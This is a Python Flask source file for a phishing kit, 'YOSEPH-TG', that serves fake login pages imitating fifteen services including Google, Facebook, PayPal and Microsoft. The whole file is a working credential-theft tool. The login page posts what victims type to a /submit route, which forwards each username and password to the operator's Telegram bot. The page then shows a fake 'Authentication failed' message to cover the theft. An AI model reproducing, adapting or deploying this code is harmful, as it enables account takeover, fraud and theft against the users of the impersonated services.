import os, requests, sys, base64, time
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration & Security ---
CONFIG_FILE = "config.txt"
TOOL_NAME = "YOSEPH-TG"
# '@Yosephalganeh44' - Base64 Encoded for protection
ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" 
SELECTED_PLATFORM = {}

# --- Templates Database (15+ Platforms) ---
TEMPLATES = {
    "1": {"name": "Telegram", "color": "#3390ec", "logo": "https://telegram.org/img/t_logo.png"},
    "2": {"name": "Facebook", "color": "#1877f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"},
    "3": {"name": "Instagram", "color": "linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"},
    "4": {"name": "Google", "color": "#ea4335", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"},
    "5": {"name": "TikTok", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"},
    "6": {"name": "WhatsApp", "color": "#25d366", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"},
    "7": {"name": "Snapchat", "color": "#fffc00", "logo": "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "text": "black"},
    "8": {"name": "Twitter/X", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_(white).svg"},
    "9": {"name": "Netflix", "color": "#e50914", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"},
    "10": {"name": "PayPal", "color": "#003087", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg"},
    "11": {"name": "Spotify", "color": "#1DB954", "logo": "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg"},
    "12": {"name": "LinkedIn", "color": "#0077b5", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png"},
    "13": {"name": "Microsoft", "color": "#00a4ef", "logo": "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"},
    "14": {"name": "GitHub", "color": "#24292e", "logo": "https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg"},
    "15": {"name": "Steam", "color": "#171a21", "logo": "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg"}
}

def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""\033[96m
 █▄─█─▄█─▄▄─█─▄▄▄─█▄─▄▄─█─█─█─▀█▄─▄▄─█
 ─█─▀─██─█─║█─█─▄█─█─█─║█─█─█──█─█─║█
 ─▀───▀▀▄▄▀▀▀▄▄▄▀▀▄▄▀▀▀▀▀▀▀▀▀──▀▄▄▀▀▀
      DEVELOPER: \033[93mYoseph Alganeh (TELEGRAM:@JO_INVISBLE)\033[96m
 ════════════════════════════════════════\033[0m""")

def check_access():
    clear(); banner()
    p = input("\033[93m[?] Enter Access Password: \033[0m").strip()
    # Security: Base64 obfuscation for access control
    if p != base64.b64decode(ENCODED_PASS).decode():
        print("\033[91m[!] Access Denied!\033[0m"); sys.exit()
    print("\033[92m[+] Access Granted!\033[0m"); time.sleep(1)

def show_menu():
    global SELECTED_PLATFORM
    clear(); banner()
    print("\033[95m  [ SELECT A TARGET PLATFORM ]\033[0m")
    print("  ----------------------------")
    for k, v in TEMPLATES.items():
        print(f"  [\033[92m{k}\033[0m] {v['name']}")
    print("  [\033[91m0\033[0m] Exit")
    
    c = input("\n\033[93m[YOSEPH-TG] > \033[0m").strip()
    if c == '0': sys.exit()
    if c in TEMPLATES:
        SELECTED_PLATFORM = TEMPLATES[c]
        print(f"\n\033[92m[*] Serving: {SELECTED_PLATFORM['name']}...\033[0m")
    else:
        print("\033[91mInvalid choice!\033[0m"); time.sleep(1); show_menu()

def setup_bot():
    if not os.path.exists(CONFIG_FILE):
        # Configuration for Telegram Bot API integration
        t = input("\n\033[93m[?] Bot Token: \033[0m").strip()
        i = input("\033[93m[?] Chat ID: \033[0m").strip()
        with open(CONFIG_FILE, "w") as f: f.write(f"{t}\n{i}")
        return t, i
    with open(CONFIG_FILE, "r") as f:
        d = f.read().splitlines()
        return d[0], d[1]

# --- HTML Template (Professional Phishing Page Design) ---
HTML_UI = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ name }} | Secure Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen p-4">
    <div class="bg-white p-8 rounded-3xl shadow-2xl w-full max-w-sm border border-gray-100">
        <img src="{{ logo }}" class="w-16 h-16 mx-auto mb-6 object-contain">
        <h2 class="text-2xl font-black text-center text-gray-800 mb-2">Sign in</h2>
        <p class="text-gray-400 text-center text-sm mb-8">Use your {{ name }} account</p>
        
        <div class="space-y-4">
            <input type="text" id="u" placeholder="Email, Phone or Username" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 transition">
            <input type="password" id="p" placeholder="Password" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 transition">
            <button onclick="send()" style="background: {{ color }}; color: {{ text_color|default('white') }}" class="w-full p-4 font-black rounded-xl shadow-lg hover:opacity-90 transition">LOG IN</button>
        </div>
        <p id="st" class="mt-6 text-center text-sm font-semibold"></p>
    </div>
    <script>
        async function send() {
            let u = document.getElementById('u').value;
            let p = document.getElementById('p').value;
            let st = document.getElementById('st');
            if(u.length < 4 || p.length < 4) { st.className="mt-6 text-center text-red-500"; st.innerText="Invalid Input!"; return; }
            st.className="mt-6 text-center text-gray-500"; st.innerText="Verifying credentials...";
            await fetch('/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:u, p:p}) });
            setTimeout(() => { st.className="mt-6 text-center text-red-500"; st.innerText="Authentication failed. Please try again."; }, 2000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_UI, 
                                 name=SELECTED_PLATFORM['name'], 
                                 color=SELECTED_PLATFORM['color'], 
                                 logo=SELECTED_PLATFORM['logo'],
                                 text_color=SELECTED_PLATFORM.get('text', 'white'))

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    # Data captured and sent via bot logic
    msg = f"🔥 *{TOOL_NAME} - SUCCESS*\n\n" \
          f"🌐 *Platform:* `{SELECTED_PLATFORM['name']}`\n" \
          f"👤 *Username:* `{data['u']}`\n" \
          f"🔑 *Password:* `{data['p']}`\n\n" \
          f"_Captured successfully via Web Server_"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"s": "ok"})

if __name__ == '__main__':
    check_access() # Access lock
    BOT_TOKEN, CHAT_ID = setup_bot()
    show_menu() # Zphisher style selection menu
    print(f"\033[94m[*] Local Server: http://127.0.0.1:5000\033[0m")
    # Flask web server deployment
    app.run(host='0.0.0.0', port=5000)
